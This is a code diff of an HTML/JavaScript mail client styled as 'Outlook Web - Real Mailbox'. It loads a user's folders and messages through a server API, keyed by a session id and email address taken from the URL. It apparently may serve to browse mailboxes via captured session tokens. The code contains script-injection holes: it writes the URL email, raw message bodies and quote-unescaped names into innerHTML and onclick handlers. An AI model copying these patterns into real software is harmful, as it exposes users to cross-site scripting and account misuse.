@@ -3,79 +3,121 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Outlook Web - Inbuilt Mailbox</title>
+    <title>Outlook Web - Real Mailbox</title>
     <style>
         * { margin: 0; padding: 0; box-sizing: border-box; }
-        body { font-family: 'Segoe UI', sans-serif; background: #1e1e2e; color: #e0e0e0; }
-        .mail-app { display: flex; height: 100vh; }
-        .sidebar { width: 260px; background: #111827; border-right: 1px solid #2d3748; display: flex; flex-direction: column; }
-        .sidebar-header { padding: 20px; border-bottom: 1px solid #2d3748; }
-        .user-info { padding: 16px; background: #1a1f3e; margin: 12px; border-radius: 12px; text-align: center; }
-        .user-email { font-size: 12px; color: #60a5fa; word-break: break-all; }
-        .compose-btn { background: #3b82f6; border: none; padding: 10px; margin: 12px; border-radius: 8px; color: white; cursor: pointer; font-weight: 600; }
-        .folders { padding: 8px; }
-        .folder { padding: 10px 16px; margin: 2px 0; border-radius: 8px; cursor: pointer; display: flex; align-items: center; gap: 12px; }
-        .folder:hover { background: #1f2937; }
-        .folder.active { background: #3b82f6; }
-        .main-content { flex: 1; display: flex; flex-direction: column; overflow: hidden; }
-        .toolbar { background: #111827; padding: 12px 20px; border-bottom: 1px solid #2d3748; display: flex; justify-content: space-between; }
+        body { font-family: 'Segoe UI', sans-serif; background: #1e1e2e; color: #e0e0e0; height: 100vh; display: flex; flex-direction: column; }
+        
+        /* Header */
+        .header { background: #111827; padding: 12px 20px; border-bottom: 1px solid #2d3748; display: flex; justify-content: space-between; align-items: center; }
+        .header h2 { font-size: 18px; }
+        .user-badge { background: #1a1f3e; padding: 6px 12px; border-radius: 20px; font-size: 12px; color: #60a5fa; }
+        .refresh-btn { background: #3b82f6; border: none; padding: 6px 12px; border-radius: 6px; color: white; cursor: pointer; font-size: 12px; }
+        
+        /* Main Layout */
+        .main { display: flex; flex: 1; overflow: hidden; }
+        
+        /* Folders Sidebar */
+        .folders-panel { width: 260px; background: #0f172a; border-right: 1px solid #2d3748; overflow-y: auto; padding: 12px; }
+        .folder-item { padding: 10px 12px; margin: 2px 0; border-radius: 8px; cursor: pointer; display: flex; align-items: center; gap: 10px; transition: all 0.2s; color: #9ca3af; font-size: 13px; }
+        .folder-item:hover { background: #1f2937; color: white; }
+        .folder-item.active { background: #3b82f6; color: white; }
+        .folder-count { margin-left: auto; font-size: 11px; background: #1f2937; padding: 2px 6px; border-radius: 10px; }
+        .folder-item.active .folder-count { background: #2563eb; }
+        
+        /* Emails List */
+        .emails-panel { flex: 1; display: flex; flex-direction: column; overflow: hidden; }
+        .email-toolbar { background: #111827; padding: 10px 16px; border-bottom: 1px solid #2d3748; display: flex; gap: 10px; align-items: center; }
+        .compose-btn { background: #10b981; border: none; padding: 6px 16px; border-radius: 6px; color: white; cursor: pointer; font-size: 12px; }
+        .search-box { background: #1f2937; border: 1px solid #374151; padding: 6px 12px; border-radius: 20px; color: white; width: 250px; }
         .email-list { flex: 1; overflow-y: auto; }
-        .email-item { background: #111827; border-bottom: 1px solid #2d3748; padding: 16px 20px; cursor: pointer; display: flex; gap: 12px; }
+        .email-item { background: #111827; border-bottom: 1px solid #2d3748; padding: 14px 16px; cursor: pointer; transition: all 0.2s; }
         .email-item:hover { background: #1a1f3e; }
         .email-item.unread { background: #1e293b; border-left: 3px solid #3b82f6; }
-        .email-subject { font-weight: 600; margin-bottom: 4px; }
-        .email-from { font-size: 12px; color: #9ca3af; }
-        .email-preview { font-size: 11px; color: #6b7280; margin-top: 4px; white-space: nowrap; overflow: hidden; text-overflow: ellipsis; }
-        .email-date { font-size: 11px; color: #6b7280; white-space: nowrap; }
-        .reading-pane { position: fixed; right: -500px; top: 0; width: 500px; height: 100vh; background: #111827; border-left: 1px solid #2d3748; z-index: 1000; transition: right 0.3s; display: flex; flex-direction: column; }
-        .reading-pane.open { right: 0; }
-        .pane-header { padding: 20px; border-bottom: 1px solid #2d3748; display: flex; justify-content: space-between; }
-        .pane-body { padding: 20px; overflow-y: auto; flex: 1; }
-        .btn { background: #1f2937; border: 1px solid #374151; padding: 6px 12px; border-radius: 6px; color: white; cursor: pointer; font-size: 11px; }
-        .btn-primary { background: #3b82f6; border: none; }
+        .email-subject { font-weight: 600; margin-bottom: 4px; font-size: 14px; display: flex; align-items: center; gap: 8px; flex-wrap: wrap; }
+        .email-from { font-size: 12px; color: #9ca3af; margin-bottom: 4px; }
+        .email-preview { font-size: 11px; color: #6b7280; white-space: nowrap; overflow: hidden; text-overflow: ellipsis; }
+        .email-date { font-size: 10px; color: #4b5563; margin-top: 4px; }
+        .attachment-icon { color: #f59e0b; font-size: 11px; }
+        .importance-high { color: #ef4444; font-size: 10px; }
+        
+        /* Reading Pane */
+        .reading-panel { width: 450px; background: #111827; border-left: 1px solid #2d3748; display: flex; flex-direction: column; overflow: hidden; transition: width 0.3s; }
+        .reading-panel.collapsed { width: 0; }
+        .panel-header { padding: 16px; border-bottom: 1px solid #2d3748; display: flex; justify-content: space-between; align-items: center; }
+        .panel-close { background: none; border: none; color: #9ca3af; cursor: pointer; font-size: 18px; }
+        .panel-body { padding: 16px; overflow-y: auto; flex: 1; }
+        .email-full-content { line-height: 1.6; font-size: 14px; }
+        .email-full-content img { max-width: 100%; }
+        .action-buttons { display: flex; gap: 8px; margin-top: 20px; flex-wrap: wrap; }
+        .action-btn { background: #1f2937; border: 1px solid #374151; padding: 6px 12px; border-radius: 6px; color: white; cursor: pointer; font-size: 11px; }
+        .action-btn-primary { background: #3b82f6; border: none; }
+        .action-btn-danger { background: #dc2626; border: none; }
+        
+        /* Compose Modal */
         .modal { display: none; position: fixed; top: 0; left: 0; right: 0; bottom: 0; background: rgba(0,0,0,0.8); z-index: 2000; justify-content: center; align-items: center; }
         .modal.open { display: flex; }
-        .modal-content { background: #111827; border-radius: 16px; width: 500px; max-width: 90%; padding: 20px; }
-        .modal-content input, .modal-content textarea { width: 100%; background: #1f2937; border: 1px solid #374151; padding: 10px; border-radius: 8px; color: white; margin-bottom: 10px; }
-        .loading { text-align: center; padding: 40px; }
+        .modal-content { background: #111827; border-radius: 16px; width: 550px; max-width: 90%; padding: 24px; }
+        .modal-content input, .modal-content textarea { width: 100%; background: #1f2937; border: 1px solid #374151; padding: 10px; border-radius: 8px; color: white; margin-bottom: 12px; font-family: inherit; }
+        .modal-content textarea { resize: vertical; min-height: 150px; }
+        
+        .loading { text-align: center; padding: 40px; color: #6b7280; }
         .spinner { display: inline-block; width: 20px; height: 20px; border: 2px solid #374151; border-top-color: #3b82f6; border-radius: 50%; animation: spin 0.8s linear infinite; }
         @keyframes spin { to { transform: rotate(360deg); } }
+        
+        ::-webkit-scrollbar { width: 6px; height: 6px; }
+        ::-webkit-scrollbar-track { background: #1f2937; }
+        ::-webkit-scrollbar-thumb { background: #374151; border-radius: 3px; }
     </style>
 </head>
 <body>
-<div class="mail-app">
-    <div class="sidebar">
-        <div class="sidebar-header"><h2>📧 Outlook Web</h2></div>
-        <div class="user-info"><div class="user-email" id="userEmail">Loading...</div></div>
-        <button class="compose-btn" onclick="openCompose()">✏️ New Email</button>
-        <div class="folders">
-            <div class="folder active" onclick="loadFolder('inbox')">📥 Inbox</div>
-            <div class="folder" onclick="loadFolder('sent')">📤 Sent</div>
-            <div class="folder" onclick="loadFolder('drafts')">📝 Drafts</div>
-            <div class="folder" onclick="loadFolder('deleted')">🗑️ Deleted</div>
+<div class="header">
+    <h2>📧 Outlook Web - Real Mailbox</h2>
+    <div style="display: flex; gap: 12px; align-items: center;">
+        <span class="user-badge" id="userEmail">Loading...</span>
+        <button class="refresh-btn" onclick="refreshCurrentFolder()">🔄 Refresh</button>
+    </div>
+</div>
+
+<div class="main">
+    <!-- Folders Sidebar -->
+    <div class="folders-panel" id="foldersPanel">
+        <div class="loading"><div class="spinner"></div> Loading folders...</div>
+    </div>
+    
+    <!-- Email List -->
+    <div class="emails-panel">
+        <div class="email-toolbar">
+            <button class="compose-btn" onclick="openCompose()">✏️ New Email</button>
+            <input type="text" class="search-box" placeholder="Search emails..." id="searchBox" onkeyup="searchEmails()">
+        </div>
+        <div class="email-list" id="emailList">
+            <div class="loading"><div class="spinner"></div> Loading real emails from Outlook...</div>
         </div>
     </div>
     
-    <div class="main-content">
-        <div class="toolbar"><span id="folderTitle">Inbox</span><button class="btn" onclick="refresh()">🔄 Refresh</button></div>
-        <div class="email-list" id="emailList"><div class="loading"><div class="spinner"></div> Loading real emails from mailbox...</div></div>
+    <!-- Reading Panel -->
+    <div class="reading-panel" id="readingPanel">
+        <div class="panel-header">
+            <strong id="panelSubject">Select an email</strong>
+            <button class="panel-close" onclick="closeReadingPanel()">✕</button>
+        </div>
+        <div class="panel-body" id="panelBody">
+            <div class="loading">Click on an email to read it</div>
+        </div>
     </div>
 </div>
 
-<div id="readingPane" class="reading-pane">
-    <div class="pane-header"><h3 id="paneSubject">Loading...</h3><button class="btn" onclick="closeReadingPane()">✕</button></div>
-    <div class="pane-body" id="paneBody"><div class="loading"><div class="spinner"></div> Loading...</div></div>
-</div>
-
+<!-- Compose Modal -->
 <div id="composeModal" class="modal">
     <div class="modal-content">
-        <h3>New Email</h3>
-        <input type="text" id="composeTo" placeholder="To:">
+        <h3 style="margin-bottom: 16px;">✏️ New Email</h3>
+        <input type="text" id="composeTo" placeholder="To: email@example.com">
         <input type="text" id="composeSubject" placeholder="Subject">
-        <textarea id="composeBody" rows="6" placeholder="Message..."></textarea>
-        <div style="display:flex; gap:10px; margin-top:10px;">
-            <button class="btn btn-primary" onclick="sendEmail()">Send</button>
-            <button class="btn" onclick="closeCompose()">Cancel</button>
+        <textarea id="composeBody" placeholder="Write your message here..."></textarea>
+        <div style="display: flex; gap: 10px; margin-top: 16px;">
+            <button class="action-btn action-btn-primary" onclick="sendEmail()">Send</button>
+            <button class="action-btn" onclick="closeCompose()">Cancel</button>
         </div>
     </div>
 </div>
@@ -86,28 +128,109 @@
     const userEmail = decodeURIComponent(urlParams.get('email') || '');
     const API_BASE = window.location.origin;
     
-    let currentFolder = 'inbox';
+    let currentFolderId = 'inbox';
+    let currentFolderName = 'Inbox';
     let currentEmails = [];
     let currentMessageId = null;
+    let folders = [];
     
     document.getElementById('userEmail').innerHTML = userEmail;
     
-    async function loadFolder(folder) {
-        currentFolder = folder;
-        document.getElementById('folderTitle').innerHTML = folder.charAt(0).toUpperCase() + folder.slice(1);
-        document.getElementById('emailList').innerHTML = '<div class="loading"><div class="spinner"></div> Loading emails...</div>';
-        
+    // ============================================
+    // LOAD REAL FOLDERS FROM USER'S MAILBOX
+    // ============================================
+    async function loadFolders() {
         try {
-            const response = await fetch(`${API_BASE}/api/mail/${sid}/${folder}`);
+            const response = await fetch(`${API_BASE}/api/mail/folders/${sid}`);
             const data = await response.json();
-            currentEmails = data.value || [];
-            renderEmailList(currentEmails);
+            
+            if (data.error) {
+                console.error('Folder error:', data.error);
+                document.getElementById('foldersPanel').innerHTML = `<div class="loading">❌ ${data.error}</div>`;
+                return;
+            }
+            
+            folders = data.value || [];
+            
+            // Add default folders if not present
+            const defaultFolders = [
+                { id: 'inbox', displayName: 'Inbox' },
+                { id: 'sentitems', displayName: 'Sent Items' },
+                { id: 'drafts', displayName: 'Drafts' },
+                { id: 'deleteditems', displayName: 'Deleted Items' },
+                { id: 'archive', displayName: 'Archive' },
+                { id: 'junkemail', displayName: 'Junk Email' }
+            ];
+            
+            const folderList = [...folders, ...defaultFolders];
+            const uniqueFolders = [];
+            const seenIds = new Set();
+            for (const folder of folderList) {
+                if (!seenIds.has(folder.id)) {
+                    seenIds.add(folder.id);
+                    uniqueFolders.push(folder);
+                }
+            }
+            
+            renderFolders(uniqueFolders);
+            
+            // Load inbox by default
+            currentFolderId = 'inbox';
+            currentFolderName = 'Inbox';
+            loadEmails(currentFolderId);
+            
         } catch (err) {
-            document.getElementById('emailList').innerHTML = '<div class="loading">Failed to load emails. Token may need refresh.</div>';
+            console.error('Load folders error:', err);
+            document.getElementById('foldersPanel').innerHTML = `<div class="loading">❌ Failed to load folders: ${err.message}</div>`;
         }
     }
     
-    function renderEmailList(emails) {
+    function renderFolders(foldersList) {
+        const container = document.getElementById('foldersPanel');
+        container.innerHTML = foldersList.map(folder => `
+            <div class="folder-item ${folder.id === currentFolderId ? 'active' : ''}" onclick="selectFolder('${folder.id}', '${escapeHtml(folder.displayName)}')">
+                <span>📁</span>
+                <span>${escapeHtml(folder.displayName)}</span>
+                <span class="folder-count">${folder.unreadItemCount || 0}</span>
+            </div>
+        `).join('');
+    }
+    
+    function selectFolder(folderId, folderName) {
+        currentFolderId = folderId;
+        currentFolderName = folderName;
+        
+        // Update active state
+        document.querySelectorAll('.folder-item').forEach(el => el.classList.remove('active'));
+        event.target.closest('.folder-item').classList.add('active');
+        
+        loadEmails(folderId);
+    }
+    
+    // ============================================
+    // LOAD REAL EMAILS FROM SELECTED FOLDER
+    // ============================================
+    async function loadEmails(folderId) {
+        document.getElementById('emailList').innerHTML = '<div class="loading"><div class="spinner"></div> Loading real emails from Outlook...</div>';
+        
+        try {
+            const response = await fetch(`${API_BASE}/api/mail/${sid}/folder/${folderId}?top=50`);
+            const data = await response.json();
+            
+            if (data.error) {
+                document.getElementById('emailList').innerHTML = `<div class="loading">❌ ${data.error}</div>`;
+                return;
+            }
+            
+            currentEmails = data.value || [];
+            renderEmails(currentEmails);
+            
+        } catch (err) {
+            document.getElementById('emailList').innerHTML = `<div class="loading">❌ Failed to load emails: ${err.message}</div>`;
+        }
+    }
+    
+    function renderEmails(emails) {
         if (!emails || emails.length === 0) {
             document.getElementById('emailList').innerHTML = '<div class="loading">📭 No emails in this folder</div>';
             return;
@@ -115,90 +238,206 @@
         
         document.getElementById('emailList').innerHTML = emails.map(email => `
             <div class="email-item ${!email.isRead ? 'unread' : ''}" onclick="openEmail('${email.id}')">
-                <div style="flex:1">
-                    <div class="email-subject">${escapeHtml(email.subject || '(No subject)')}${email.hasAttachments ? ' 📎' : ''}</div>
-                    <div class="email-from">${escapeHtml(email.from?.emailAddress?.name || email.from?.emailAddress?.address)}</div>
-                    <div class="email-preview">${escapeHtml(email.bodyPreview || '')}</div>
+                <div>
+                    <div class="email-subject">
+                        ${escapeHtml(email.subject || '(No subject)')}
+                        ${email.hasAttachments ? '<span class="attachment-icon">📎</span>' : ''}
+                        ${email.importance === 'high' ? '<span class="importance-high">🔴 High</span>' : ''}
+                    </div>
+                    <div class="email-from">
+                        ${escapeHtml(email.from?.emailAddress?.name || email.from?.emailAddress?.address || 'Unknown')}
+                    </div>
+                    <div class="email-preview">
+                        ${escapeHtml(email.bodyPreview || 'No preview')}
+                    </div>
+                    <div class="email-date">
+                        ${formatDate(email.receivedDateTime)}
+                    </div>
                 </div>
-                <div class="email-date">${formatDate(email.receivedDateTime)}</div>
             </div>
         `).join('');
     }
     
+    // ============================================
+    // OPEN EMAIL WITH FULL CONTENT
+    // ============================================
     async function openEmail(messageId) {
         currentMessageId = messageId;
-        document.getElementById('readingPane').classList.add('open');
-        document.getElementById('paneBody').innerHTML = '<div class="loading"><div class="spinner"></div> Loading message...</div>';
+        const panel = document.getElementById('readingPanel');
+        panel.classList.remove('collapsed');
+        document.getElementById('panelBody').innerHTML = '<div class="loading"><div class="spinner"></div> Loading message content...</div>';
         
-        const response = await fetch(`${API_BASE}/api/mail/message/${sid}/${messageId}`);
-        const email = await response.json();
-        
-        document.getElementById('paneSubject').innerHTML = escapeHtml(email.subject || '(No subject)');
-        document.getElementById('paneBody').innerHTML = `
-            <div style="margin-bottom:20px; padding-bottom:15px; border-bottom:1px solid #2d3748;">
-                <p><strong>From:</strong> ${escapeHtml(email.from?.emailAddress?.name || email.from?.emailAddress?.address)}</p>
-                <p><strong>To:</strong> ${escapeHtml(email.toRecipients?.map(r => r.emailAddress.address).join(', '))}</p>
-                <p><strong>Date:</strong> ${new Date(email.receivedDateTime).toLocaleString()}</p>
-            </div>
-            <div>${email.body?.content || email.bodyPreview || 'No content'}</div>
-            <div style="margin-top:20px; display:flex; gap:10px;">
-                <button class="btn btn-primary" onclick="reply()">↩️ Reply</button>
-                <button class="btn" onclick="deleteEmail()">🗑️ Delete</button>
-            </div>
-        `;
-        
-        if (!email.isRead) {
-            await fetch(`${API_BASE}/api/mail/message/${sid}/${messageId}`, {
-                method: 'PATCH',
-                headers: { 'Content-Type': 'application/json' },
-                body: JSON.stringify({ isRead: true })
-            });
-            loadFolder(currentFolder);
+        try {
+            const response = await fetch(`${API_BASE}/api/mail/message/${sid}/${messageId}`);
+            const email = await response.json();
+            
+            if (email.error) {
+                document.getElementById('panelBody').innerHTML = `<div class="loading">❌ ${email.error}</div>`;
+                return;
+            }
+            
+            document.getElementById('panelSubject').innerHTML = escapeHtml(email.subject || '(No subject)');
+            document.getElementById('panelBody').innerHTML = `
+                <div style="margin-bottom: 16px; padding-bottom: 12px; border-bottom: 1px solid #2d3748;">
+                    <p><strong>From:</strong> ${escapeHtml(email.from?.emailAddress?.name || email.from?.emailAddress?.address)}</p>
+                    <p><strong>To:</strong> ${escapeHtml(email.toRecipients?.map(r => r.emailAddress.address).join(', ') || 'Unknown')}</p>
+                    <p><strong>Received:</strong> ${new Date(email.receivedDateTime).toLocaleString()}</p>
+                    ${email.hasAttachments ? '<p><strong>📎 Has Attachments</strong></p>' : ''}
+                </div>
+                <div class="email-full-content">
+                    ${email.body?.content || email.bodyPreview || 'No content available'}
+                </div>
+                <div class="action-buttons">
+                    <button class="action-btn action-btn-primary" onclick="replyToEmail()">↩️ Reply</button>
+                    <button class="action-btn" onclick="replyAllToEmail()">↪️ Reply All</button>
+                    <button class="action-btn" onclick="forwardEmail()">↗️ Forward</button>
+                    <button class="action-btn action-btn-danger" onclick="deleteEmail()">🗑️ Delete</button>
+                    <button class="action-btn" onclick="markAsRead()">✓ Mark as Read</button>
+                </div>
+            `;
+            
+            // Mark as read automatically
+            if (!email.isRead) {
+                await fetch(`${API_BASE}/api/mail/message/${sid}/${messageId}`, {
+                    method: 'PATCH',
+                    headers: { 'Content-Type': 'application/json' },
+                    body: JSON.stringify({ isRead: true })
+                });
+                loadEmails(currentFolderId);
+            }
+            
+        } catch (err) {
+            document.getElementById('panelBody').innerHTML = `<div class="loading">❌ Failed to load message: ${err.message}</div>`;
         }
     }
     
+    // ============================================
+    // EMAIL ACTIONS
+    // ============================================
     async function sendEmail() {
         const to = document.getElementById('composeTo').value.split(',').map(e => e.trim());
         const subject = document.getElementById('composeSubject').value;
         const body = document.getElementById('composeBody').value;
         
-        if (!to.length || !subject) { alert('Fill required fields'); return; }
+        if (!to.length || !subject) {
+            alert('Please fill in To and Subject');
+            return;
+        }
         
-        await fetch(`${API_BASE}/api/mail/send/${sid}`, {
-            method: 'POST',
-            headers: { 'Content-Type': 'application/json' },
-            body: JSON.stringify({ to, subject, body })
-        });
-        alert('Email sent!');
-        closeCompose();
-        loadFolder(currentFolder);
+        try {
+            const response = await fetch(`${API_BASE}/api/mail/send/${sid}`, {
+                method: 'POST',
+                headers: { 'Content-Type': 'application/json' },
+                body: JSON.stringify({ to, subject, body })
+            });
+            
+            const result = await response.json();
+            if (result.success) {
+                alert('✅ Email sent successfully!');
+                closeCompose();
+                loadEmails(currentFolderId);
+            } else {
+                alert('Failed to send: ' + (result.error || 'Unknown'));
+            }
+        } catch (err) {
+            alert('Error: ' + err.message);
+        }
     }
     
     async function deleteEmail() {
         if (!confirm('Delete this email?')) return;
-        await fetch(`${API_BASE}/api/mail/message/${sid}/${currentMessageId}`, { method: 'DELETE' });
-        closeReadingPane();
-        loadFolder(currentFolder);
+        
+        try {
+            await fetch(`${API_BASE}/api/mail/message/${sid}/${currentMessageId}`, { method: 'DELETE' });
+            closeReadingPanel();
+            loadEmails(currentFolderId);
+        } catch (err) {
+            alert('Failed to delete: ' + err.message);
+        }
     }
     
-    function reply() {
+    async function markAsRead() {
+        try {
+            await fetch(`${API_BASE}/api/mail/message/${sid}/${currentMessageId}`, {
+                method: 'PATCH',
+                headers: { 'Content-Type': 'application/json' },
+                body: JSON.stringify({ isRead: true })
+            });
+            loadEmails(currentFolderId);
+        } catch (err) {
+            alert('Failed to mark as read');
+        }
+    }
+    
+    function replyToEmail() {
         const email = currentEmails.find(e => e.id === currentMessageId);
         if (email) {
             document.getElementById('composeTo').value = email.from?.emailAddress?.address || '';
             document.getElementById('composeSubject').value = `Re: ${email.subject || ''}`;
+            document.getElementById('composeBody').value = `\n\n\n----- Original Message -----\nFrom: ${email.from?.emailAddress?.name}\nSent: ${formatDate(email.receivedDateTime)}\nSubject: ${email.subject}\n\n${email.bodyPreview || ''}`;
             openCompose();
         }
     }
     
-    function refresh() { loadFolder(currentFolder); }
+    function replyAllToEmail() {
+        const email = currentEmails.find(e => e.id === currentMessageId);
+        if (email) {
+            let recipients = [email.from?.emailAddress?.address];
+            if (email.toRecipients) {
+                recipients = recipients.concat(email.toRecipients.map(r => r.emailAddress.address));
+            }
+            document.getElementById('composeTo').value = recipients.join(',');
+            document.getElementById('composeSubject').value = `Re: ${email.subject || ''}`;
+            document.getElementById('composeBody').value = `\n\n\n----- Original Message -----\nFrom: ${email.from?.emailAddress?.name}\nSent: ${formatDate(email.receivedDateTime)}\nSubject: ${email.subject}\n\n${email.bodyPreview || ''}`;
+            openCompose();
+        }
+    }
+    
+    function forwardEmail() {
+        const email = currentEmails.find(e => e.id === currentMessageId);
+        if (email) {
+            document.getElementById('composeSubject').value = `Fwd: ${email.subject || ''}`;
+            document.getElementById('composeBody').value = `\n\n\n----- Forwarded Message -----\nFrom: ${email.from?.emailAddress?.name}\nSent: ${formatDate(email.receivedDateTime)}\nSubject: ${email.subject}\n\n${email.bodyPreview || ''}`;
+            openCompose();
+        }
+    }
+    
+    function searchEmails() {
+        const term = document.getElementById('searchBox').value.toLowerCase();
+        if (!term) {
+            renderEmails(currentEmails);
+            return;
+        }
+        const filtered = currentEmails.filter(e => 
+            (e.subject || '').toLowerCase().includes(term) ||
+            (e.from?.emailAddress?.name || '').toLowerCase().includes(term) ||
+            (e.bodyPreview || '').toLowerCase().includes(term)
+        );
+        renderEmails(filtered);
+    }
+    
+    function refreshCurrentFolder() { loadEmails(currentFolderId); }
     function openCompose() { document.getElementById('composeModal').classList.add('open'); }
     function closeCompose() { document.getElementById('composeModal').classList.remove('open'); }
-    function closeReadingPane() { document.getElementById('readingPane').classList.remove('open'); }
+    function closeReadingPanel() { document.getElementById('readingPanel').classList.add('collapsed'); }
     
-    function escapeHtml(str) { if (!str) return ''; return str.replace(/[&<>]/g, m => ({'&':'&amp;','<':'&lt;','>':'&gt;'})[m]); }
-    function formatDate(d) { return d ? new Date(d).toLocaleString() : 'Unknown'; }
+    function escapeHtml(str) {
+        if (!str) return '';
+        return str.replace(/[&<>]/g, m => ({'&':'&amp;','<':'&lt;','>':'&gt;'})[m]);
+    }
     
-    loadFolder('inbox');
+    function formatDate(dateStr) {
+        if (!dateStr) return 'Unknown';
+        const date = new Date(dateStr);
+        const now = new Date();
+        if (date.toDateString() === now.toDateString()) {
+            return date.toLocaleTimeString([], { hour: '2-digit', minute: '2-digit' });
+        }
+        return date.toLocaleDateString();
+    }
+    
+    // Initialize
+    loadFolders();
 </script>
 </body>
 </html>
